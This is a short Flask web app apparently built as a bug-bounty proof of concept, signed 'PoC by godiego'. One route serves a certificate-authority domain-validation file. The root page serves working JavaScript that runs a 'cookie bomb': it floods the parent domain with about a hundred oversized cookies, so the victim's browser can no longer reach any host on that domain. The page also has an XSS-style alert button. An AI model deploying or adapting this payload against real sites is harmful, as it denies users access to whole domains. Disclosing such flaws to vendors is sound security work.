from flask import Flask
app = Flask(__name__)

@app.route('/.well-known/pki-validation/76E0FFBF162C024AE65B7626B6EC72B8.txt')
def hi():
		return """8E5AEBD3CD5EFD586617827D7B7BAC73C5B48B483E10FEB63B276E998B35A046
comodoca.com
607d88781192c11"""


@app.route("/")
def hello():
		poc = """<html>
<script>
	function cookiebomb(){
		var d = document.domain.split(".").splice(-2).join(".");
		var pollution = Array(4000).join('a');
		for(var i=1;i<99;i++){
			document.cookie='bomb'+i+'='+pollution+';Domain='+d+';Path=/';
		}
		setTimeout(()=>{alert("Cookie bomb complete! You can no longer access any host on "+d+" in your browser.")}, 1000);
	}
</script>
<h1>PoC by godiego</h1>
<button onclick="alert(document.domain)">Alert</button><br><br>
<button onclick="cookiebomb()">Cookie bomb</button>
</html>
		"""
		return poc
